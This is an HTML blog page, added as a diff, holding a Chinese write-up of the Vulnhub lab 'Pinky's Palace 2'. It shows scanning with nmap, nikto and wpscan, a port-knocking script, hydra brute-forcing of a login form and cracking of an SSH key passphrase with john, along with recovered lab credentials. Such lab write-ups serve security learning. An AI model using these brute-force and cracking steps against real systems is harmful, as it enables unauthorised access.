@@ -1,0 +1,585 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="G00d">
+
+
+    <meta name="subtitle" content="没有人会一直一帆风顺，失败和挫折才是人生常态">
+
+
+
+    <meta name="keywords" content="G00dddd">
+
+
+<title>Vulnhub-27Pinky.s-Palace-2 | G00d`s Blog</title>
+
+
+
+    <link rel="icon" href="../favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="../css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="../js/script.js"></script>
+    
+    <script src="../js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+    //创建雪花元素
+    function snow() {
+      //获取视窗的宽高
+      var width = window.innerWidth;
+      var height = window.innerHeight;
+  
+      var snow = document.createElement("div");             //创建元素
+  
+      //初始化雪花样式
+      size = Math.random() * 15 + 10;                          //随机生成雪花大小
+      snow.style.width = size + "px";
+      snow.style.height = size + "px";
+      snow.style.background = "url(img/雪花" + Math.floor((Math.random()*6)+1) + ".png) no-repeat";   //1-6随机选择雪花的图片
+      // snow.style.background = "url(./雪花.png) no-repeat";
+      snow.style.backgroundSize = '100% 100%';
+      snow.style.position = "fixed";                        //元素的位置相对于浏览器窗口是固定位置，即使窗口是滚动的它也不会移动
+      snow.style.filter = "blur(1px)";                      //给图片设置高斯模糊
+      snow.style.left = Math.random() * width + 'px';         //随机生成雪花的初始位置
+      snow.style.top = "10px";
+      snow.style.opacity = parseInt(Math.random()*10)/2;   //随机生成雪花的透明度
+  
+      //向body添加元素
+      document.body.appendChild(snow);
+  
+      //创建定时器，每30ms雪花下落一次
+      var timer = setInterval(function () {
+        snow.style.top = parseInt(snow.style.top) + 3 + 'px';     //每次下落3px
+  
+        //当雪花到达底部后清除元素
+        if (parseInt(snow.style.top) >= height) {
+          clearInterval(timer);
+          snow.parentNode.removeChild(snow)
+        }
+      }, 30)
+    }
+  
+    //页面加载完成执行函数
+    window.onload = function play() {
+      //创建定时器，每300ms生成一朵雪花
+      setInterval(function () {
+        snow()
+      }, 300)
+    }
+  </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+    //蜘蛛网特效
+    !
+    function() {
+        function n(n, e, t) {
+            return n.getAttribute(e) || t
+        }
+        function e(n) {
+            return document.getElementsByTagName(n)
+        }
+        function t() {
+            var t = e("script"),
+            o = t.length,
+            i = t[o - 1];
+            return {
+                l: o,
+                z: n(i, "zIndex", -1),
+                o: n(i, "opacity", .9),   //透明度
+                c: n(i, "color", "255, 102, 153"),   //颜色
+                n: n(i, "count", 99)
+            }
+        }
+        function o() {
+            a = m.width = window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth,
+            c = m.height = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight
+        }
+        function i() {
+            r.clearRect(0, 0, a, c);
+            var n, e, t, o, m, l;
+            s.forEach(function(i, x) {
+                for (i.x += i.xa, i.y += i.ya, i.xa *= i.x > a || i.x < 0 ? -1 : 1, i.ya *= i.y > c || i.y < 0 ? -1 : 1, r.fillRect(i.x - .5, i.y - .5, 1, 1), e = x + 1; e < u.length; e++) n = u[e],
+                null !== n.x && null !== n.y && (o = i.x - n.x, m = i.y - n.y, l = o * o + m * m, l < n.max && (n === y && l >= n.max / 2 && (i.x -= .03 * o, i.y -= .03 * m), t = (n.max - l) / n.max, r.beginPath(), r.lineWidth = t / 2, r.strokeStyle = "rgba(" + d.c + "," + (t + .2) + ")", r.moveTo(i.x, i.y), r.lineTo(n.x, n.y), r.stroke()))
+            }),
+            x(i)
+        }
+        var a, c, u, m = document.createElement("canvas"),
+        d = t(),
+        l = "c_n" + d.l,
+        r = m.getContext("2d"),
+        x = window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || window.oRequestAnimationFrame || window.msRequestAnimationFrame ||
+        function(n) {
+            window.setTimeout(n, 1e3 / 45)
+        },
+        w = Math.random,
+        y = {
+            x: null,
+            y: null,
+            max: 2e4
+        };
+        m.id = l,
+        m.style.cssText = "position:fixed;top:0;left:0;z-index:" + d.z + ";opacity:" + d.o,
+        e("body")[0].appendChild(m),
+        o(),
+        window.onresize = o,
+        window.onmousemove = function(n) {
+            n = n || window.event,
+            y.x = n.clientX,
+            y.y = n.clientY
+        },
+        window.onmouseout = function() {
+            y.x = null,
+            y.y = null
+        };
+        for (var s = [], f = 0; d.n > f; f++) {
+            var h = w() * a,
+            g = w() * c,
+            v = 2 * w() - 1,
+            p = 2 * w() - 1;
+            s.push({
+                x: h,
+                y: g,
+                xa: v,
+                ya: p,
+                max: 6e3
+            })
+        }
+        u = s.concat([y]),
+        setTimeout(function() {
+            i()
+        },
+        100)
+    } ();
+
+    //蜘蛛网特效
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">G00d&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="../archives">Posts</a>
+                
+                    <a class="menu-item" href="../category">Categories</a>
+                
+                    <a class="menu-item" href="../tag">Tags</a>
+                
+                    <a class="menu-item" href="../about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">G00d&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="../archives">Posts</a>
+                
+                    <a class="menu-item" href="../category">Categories</a>
+                
+                    <a class="menu-item" href="../tag">Tags</a>
+                
+                    <a class="menu-item" href="../about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Vulnhub-27Pinky.s-Palace-2</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">G00d</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">十二月 1, 2024&nbsp;&nbsp;18:19:43</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="../categories/Vulnhub/">Vulnhub</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="27Pinky-s-Palace-2"><a href="#27Pinky-s-Palace-2" class="headerlink" title="27Pinky.s-Palace-2"></a>27Pinky.s-Palace-2</h1><p><img src="/vulnhub-27pinky-s-palace-2//image-20241201182025178.png" alt="image-20241201182025178"></p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">arp</span>-scan -l          nmap --min-rate <span class="number">100000</span> -p- <span class="number">192.168.240.134</span>     nmap --min-rate <span class="number">100000</span> -p80,<span class="number">4655</span>,<span class="number">7654</span>,<span class="number">31337</span> -A <span class="number">192.168.240.134</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">dirsearch</span> -u <span class="number">192.168.240.133</span>   dirb  http://<span class="number">192.168.240.133</span>/      nikto -host <span class="number">192.168.240.134</span> -p <span class="number">80</span></span><br><span class="line"><span class="attribute">wpscan</span> --url http://<span class="number">192.168.240.134</span> --enumerate u  //枚举用户</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">└─# nmap <span class="comment">--min-rate 100000 -p- 192.168.240.134</span></span><br><span class="line">Starting Nmap <span class="number">7.94</span>SVN ( https://nmap.org ) at <span class="number">2024</span><span class="number">-12</span><span class="number">-01</span> <span class="number">18</span>:<span class="number">20</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.240</span><span class="number">.134</span></span><br><span class="line">Host <span class="keyword">is</span> up (<span class="number">0.0059</span>s latency).</span><br><span class="line"><span class="keyword">Not</span> shown: <span class="number">65531</span> closed tcp ports (<span class="keyword">reset</span>)</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line"><span class="number">80</span>/tcp    <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">4655</span>/tcp  <span class="keyword">open</span>  <span class="type">unknown</span></span><br><span class="line"><span class="number">7654</span>/tcp  <span class="keyword">open</span>  <span class="type">unknown</span></span><br><span class="line"><span class="number">31337</span>/tcp <span class="keyword">open</span>  Elite</span><br><span class="line">MAC Address: <span class="number">00</span>:<span class="number">0</span>C:<span class="number">29</span>:<span class="number">2</span>E:ED:<span class="number">51</span> (VMware)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">80</span>/tcp    open  http    Apache httpd <span class="number">2.4</span><span class="number">.25</span> ((Debian))</span><br><span class="line">|<span class="type">_http</span>-server-header: Apache/<span class="number">2.4</span><span class="number">.25</span> (Debian)</span><br><span class="line">|<span class="type">_http</span>-title: Pinky&amp;#<span class="number">039</span>;s Blog &amp;#<span class="number">8211</span>; Just another WordPress site</span><br><span class="line">|<span class="type">_http</span>-generator: WordPress <span class="number">4.9</span><span class="number">.4</span></span><br><span class="line"><span class="number">4655</span>/tcp  open  ssh     OpenSSH <span class="number">7.4</span>p1 Debian <span class="number">10</span>+deb9u3 (protocol <span class="number">2.0</span>)</span><br><span class="line">| <span class="type">ssh</span>-hostkey:</span><br><span class="line">|   <span class="type">2048</span> ac:e6:<span class="number">41</span>:<span class="number">77</span>:<span class="number">60</span>:<span class="number">1</span>f:e8:<span class="number">7</span>c:<span class="number">02</span>:<span class="number">13</span>:ae:a1:<span class="number">33</span>:<span class="number">09</span>:<span class="number">94</span>:b7 (RSA)</span><br><span class="line">|   <span class="type">256</span> <span class="number">3</span>a:<span class="number">48</span>:<span class="number">63</span>:f9:d2:<span class="number">07</span>:ea:<span class="number">43</span>:<span class="number">78</span>:<span class="number">7</span>d:e1:<span class="number">93</span>:eb:f1:d2:<span class="number">3</span>a (ECDSA)</span><br><span class="line">|<span class="type">_</span>  <span class="number">256</span> b1:<span class="number">10</span>:<span class="number">03</span>:dc:bb:f3:<span class="number">0</span>d:<span class="number">9</span>b:<span class="number">3</span>a:e3:e4:<span class="number">61</span>:<span class="number">03</span>:c8:<span class="number">03</span>:c7 (ED25519)</span><br><span class="line"><span class="number">7654</span>/tcp  open  http    nginx <span class="number">1.10</span><span class="number">.3</span></span><br><span class="line">|<span class="type">_http</span>-server-header: nginx/<span class="number">1.10</span><span class="number">.3</span></span><br><span class="line">|<span class="type">_http</span>-title: <span class="number">403</span> Forbidden</span><br><span class="line"><span class="number">31337</span>/tcp open  Elite?</span><br><span class="line">| <span class="type">fingerprint</span>-strings:</span><br><span class="line">|   <span class="type">DNSStatusRequestTCP</span>, DNSVersionBindReqTCP, GenericLines, NULL, RPCCheck:</span><br><span class="line">|     <span class="type">[+] Welcome</span> to The Daemon [+]</span><br><span class="line">|     <span class="type">This</span> is soon to be our backdoor</span><br><span class="line">|     <span class="type">into</span> Pinky&#x27;s Palace.</span><br><span class="line">|   <span class="type">GetRequest</span>:</span><br><span class="line">|     <span class="type">[+] Welcome</span> to The Daemon [+]</span><br><span class="line">|     <span class="type">This</span> is soon to be our backdoor</span><br><span class="line">|     <span class="type">into</span> Pinky&#x27;s Palace.</span><br><span class="line">|     <span class="type">HTTP</span>/<span class="number">1.0</span></span><br><span class="line">|   <span class="type">HTTPOptions</span>:</span><br><span class="line">|     <span class="type">[+] Welcome</span> to The Daemon [+]</span><br><span class="line">|     <span class="type">This</span> is soon to be our backdoor</span><br><span class="line">|     <span class="type">into</span> Pinky&#x27;s Palace.</span><br><span class="line">|     <span class="type">OPTIONS</span> / HTTP/<span class="number">1.0</span></span><br><span class="line">|   <span class="type">Help</span>:</span><br><span class="line">|     <span class="type">[+] Welcome</span> to The Daemon [+]</span><br><span class="line">|     <span class="type">This</span> is soon to be our backdoor</span><br><span class="line">|     <span class="type">into</span> Pinky&#x27;s Palace.</span><br><span class="line">|     <span class="type">HELP</span></span><br><span class="line">|   <span class="type">RTSPRequest</span>:</span><br><span class="line">|     <span class="type">[+] Welcome</span> to The Daemon [+]</span><br><span class="line">|     <span class="type">This</span> is soon to be our backdoor</span><br><span class="line">|     <span class="type">into</span> Pinky&#x27;s Palace.</span><br><span class="line">|     <span class="type">OPTIONS</span> / RTSP/<span class="number">1.0</span></span><br><span class="line">|   <span class="type">SIPOptions</span>:</span><br><span class="line">|     <span class="type">[+] Welcome</span> to The Daemon [+]</span><br><span class="line">|     <span class="type">This</span> is soon to be our backdoor</span><br><span class="line">|     <span class="type">into</span> Pinky&#x27;s Palace.</span><br><span class="line">|     <span class="type">OPTIONS</span> sip:nm SIP/<span class="number">2.0</span></span><br><span class="line">|     <span class="type">Via</span>: SIP/<span class="number">2.0</span>/TCP nm;branch=foo</span><br><span class="line">|     <span class="type">From</span>: &lt;sip:nm@nm&gt;;tag=root</span><br><span class="line">|     <span class="type">&lt;sip</span>:nm2@nm2&gt;</span><br><span class="line">|     <span class="type">Call</span>-ID: <span class="number">50000</span></span><br><span class="line">|     <span class="type">CSeq</span>: <span class="number">42</span> OPTIONS</span><br><span class="line">|     <span class="type">Max</span>-Forwards: <span class="number">70</span></span><br><span class="line">|     <span class="type">Content</span>-Length: <span class="number">0</span></span><br><span class="line">|     <span class="type">Contact</span>: &lt;sip:nm@nm&gt;</span><br><span class="line">|<span class="type">_</span>    Accept: application/sdp</span><br><span class="line">MAC Address: <span class="number">00</span>:<span class="number">0</span>C:<span class="number">29</span>:<span class="number">2</span>E:ED:<span class="number">51</span> (VMware)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find <span class="built_in">at</span> least <span class="number">1</span> open and <span class="number">1</span> closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux <span class="number">3.</span>X|<span class="type">4</span>.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:<span class="number">3</span> cpe:/o:linux:linux_kernel:<span class="number">4</span></span><br><span class="line">OS details: Linux <span class="number">3.2</span> - <span class="number">4.9</span></span><br><span class="line">Network Distance: <span class="number">1</span> hop</span><br><span class="line">Service <span class="keyword">Info</span>: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">└─# nikto -host <span class="number">192.168</span><span class="number">.240</span><span class="number">.134</span> -p <span class="number">80</span></span><br><span class="line">- Nikto v2<span class="number">.5</span><span class="number">.0</span></span><br><span class="line"><span class="comment">---------------------------------------------------------------------------</span></span><br><span class="line">+ Target IP:          <span class="number">192.168</span><span class="number">.240</span><span class="number">.134</span></span><br><span class="line">+ Target Hostname:    <span class="number">192.168</span><span class="number">.240</span><span class="number">.134</span></span><br><span class="line">+ Target Port:        <span class="number">80</span></span><br><span class="line">+ <span class="keyword">Start</span> <span class="type">Time</span>:         <span class="number">2024</span><span class="number">-12</span><span class="number">-01</span> <span class="number">18</span>:<span class="number">36</span>:<span class="number">12</span> (GMT8)</span><br><span class="line"><span class="comment">---------------------------------------------------------------------------</span></span><br><span class="line">+ <span class="keyword">Server</span>: Apache/<span class="number">2.4</span><span class="number">.25</span> (Debian)</span><br><span class="line">+ /: The anti-clickjacking X-Frame-<span class="keyword">Options</span> <span class="keyword">header</span> <span class="keyword">is</span> <span class="keyword">not</span> present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-<span class="keyword">Options</span></span><br><span class="line">+ /: Drupal Link <span class="keyword">header</span> <span class="built_in">found</span> <span class="keyword">with</span> <span class="keyword">value</span>: &lt;http://pinkydb/<span class="keyword">index</span>.php?rest_route=/&gt;; rel=&quot;https://api.w.org/&quot;. See: https://www.drupal.org/</span><br><span class="line">+ /: The X-Content-<span class="keyword">Type</span>-<span class="keyword">Options</span> <span class="keyword">header</span> <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">set</span>. This could allow the <span class="keyword">user</span> agent <span class="keyword">to</span> render the content <span class="keyword">of</span> the site <span class="keyword">in</span> a different fashion <span class="keyword">to</span> the MIME <span class="keyword">type</span>. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-<span class="keyword">type</span>-<span class="keyword">header</span>/</span><br><span class="line">+ <span class="keyword">No</span> CGI Directories <span class="built_in">found</span> (use <span class="string">&#x27;-C all&#x27;</span> <span class="keyword">to</span> force <span class="keyword">check</span> <span class="keyword">all</span> possible dirs)</span><br><span class="line">+ Apache/<span class="number">2.4</span><span class="number">.25</span> appears <span class="keyword">to</span> be outdated (<span class="keyword">current</span> <span class="keyword">is</span> at least Apache/<span class="number">2.4</span><span class="number">.54</span>). Apache <span class="number">2.2</span><span class="number">.34</span> <span class="keyword">is</span> the EOL <span class="keyword">for</span> the <span class="number">2.</span>x branch.</span><br><span class="line">+ /: Web <span class="keyword">Server</span> <span class="keyword">returns</span> a <span class="keyword">valid</span> response <span class="keyword">with</span> junk HTTP methods which may cause <span class="keyword">false</span> positives.</span><br><span class="line">+ /: <span class="keyword">DEBUG</span> HTTP verb may <span class="keyword">show</span> <span class="keyword">server</span> debugging information. See: https://docs.microsoft.com/en-us/visualstudio/debugger/how-<span class="keyword">to</span>-<span class="keyword">enable</span>-debugging-<span class="keyword">for</span>-aspnet-applications?<span class="keyword">view</span>=vs<span class="number">-2017</span></span><br><span class="line">+ /secret/: Directory indexing <span class="built_in">found</span>.  # 这里有个字典，<span class="number">8890</span>、<span class="number">7000</span>、<span class="number">666</span>、pinkydb</span><br><span class="line">+ /secret/: This might be interesting.</span><br><span class="line">+ /icons/README: Apache <span class="keyword">default</span> file <span class="built_in">found</span>. See: https://www.vntweb.co.uk/apache-restricting-<span class="keyword">access</span>-<span class="keyword">to</span>-iconsreadme/</span><br><span class="line">+ /wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin <span class="string">&#x27;Tested up to&#x27;</span> <span class="keyword">version</span> usually matches the WordPress <span class="keyword">version</span>.</span><br><span class="line">+ /wordpress/wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin <span class="string">&#x27;Tested up to&#x27;</span> <span class="keyword">version</span> usually matches the WordPress <span class="keyword">version</span>.</span><br><span class="line">+ /wp-links-opml.php: This WordPress script reveals the installed <span class="keyword">version</span>.</span><br><span class="line">+ /license.txt: License file <span class="built_in">found</span> may identify site software.</span><br><span class="line">+ /: A Wordpress installation was <span class="built_in">found</span>.</span><br><span class="line">+ /wp-<span class="keyword">login</span>.php?action=register: Cookie wordpress_test_cookie created <span class="keyword">without</span> the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies</span><br><span class="line">+ /wp-<span class="keyword">login</span>.php: Wordpress <span class="keyword">login</span> <span class="built_in">found</span>.</span><br><span class="line">+ <span class="number">8103</span> requests: <span class="number">0</span> error(s) <span class="keyword">and</span> <span class="number">16</span> item(s) reported <span class="keyword">on</span> remote host</span><br><span class="line">+ <span class="keyword">End</span> <span class="type">Time</span>:           <span class="number">2024</span><span class="number">-12</span><span class="number">-01</span> <span class="number">18</span>:<span class="number">36</span>:<span class="number">26</span> (GMT8) (<span class="number">14</span> seconds)</span><br><span class="line"><span class="comment">---------------------------------------------------------------------------</span></span><br><span class="line">+ <span class="number">1</span> host(s) tested</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+] pinky1337</span><br><span class="line"> | <span class="built_in">Found</span> <span class="keyword">By</span>: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed <span class="keyword">By</span>: <span class="keyword">Login</span> Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">敲一下端口</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="comment"># 生成给定数字的所有不同组合</span></span><br><span class="line">numbers = [<span class="number">8890</span>, <span class="number">7000</span>, <span class="number">666</span>]</span><br><span class="line">combinations = <span class="built_in">list</span>(itertools.permutations(numbers))</span><br><span class="line"><span class="comment"># 使用knock工具对每个组合进行尝试</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_knock</span>():</span><br><span class="line">    command = <span class="string">f&quot;knock -v 192.168.240.134 <span class="subst">&#123;combo[<span class="number">0</span>]&#125;</span> <span class="subst">&#123;combo[<span class="number">1</span>]&#125;</span> <span class="subst">&#123;combo[<span class="number">2</span>]&#125;</span>&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(command)</span><br><span class="line">    subprocess.run(command,shell=<span class="literal">True</span>)<span class="comment">#运行shell，即运行工具命令</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> combo <span class="keyword">in</span> combinations:</span><br><span class="line">        run_knock()</span><br><span class="line">        </span><br><span class="line">现在kali就能访问<span class="number">7654</span>端口和<span class="number">31337</span>端口了        </span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-27pinky-s-palace-2//image-20241201202539498.png" alt="image-20241201202539498"><img src="/vulnhub-27pinky-s-palace-2//image-20241201202611572.png" alt="image-20241201202611572"></p>
+<figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">我们知道这是pinky的blog，账号应该是pinky，再结合上面给的一个字符串（pinkydb），以及<span class="number">80</span>端口下所有字符串形成一个字典对这个登录框进行爆破一下</span><br><span class="line">cewl <span class="keyword">http</span>://pinkydb/ -w <span class="keyword">dict</span>.txt</span><br><span class="line">hydra -L <span class="keyword">dict</span>.txt -P <span class="keyword">dict</span>.txt pinkydb -s <span class="number">7654</span> <span class="keyword">http</span>-post-form <span class="string">&quot;/login.php:user=^USER^&amp;pass=^PASS^:F=Invalid Username or Password&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-27pinky-s-palace-2//image-20241201203120974.png" alt="image-20241201203120974"></p>
+<p><img src="/vulnhub-27pinky-s-palace-2//image-20241201203844293.png" alt="image-20241201203844293"></p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Pinky：Passione 登录进去有一个key和这个note</span><br><span class="line"><span class="bullet">- </span>Stefano</span><br><span class="line"><span class="bullet">- </span>Intern Web developer</span><br><span class="line"><span class="bullet">- </span>Created RSA key for security for him to login</span><br><span class="line"></span><br><span class="line">ssh登录Stefano</span><br><span class="line">ssh stefano@192.168.240.134 -p 4655 -i id<span class="emphasis">_rsa，发现登录不上，密钥有密码</span></span><br><span class="line"><span class="emphasis">用john工具对密钥的密码进行爆破，不过在爆破之前我们需要将密钥转换为john可以识别的内容，我们需要用到ssh2john工具 ssh2john id_rsa &gt; id2_rsa</span></span><br><span class="line"><span class="emphasis">john --wordlist=/usr/share/wordlists/rockyou.txt id2_</span>rsa   secretz101</span><br></pre></td></tr></table></figure>
+
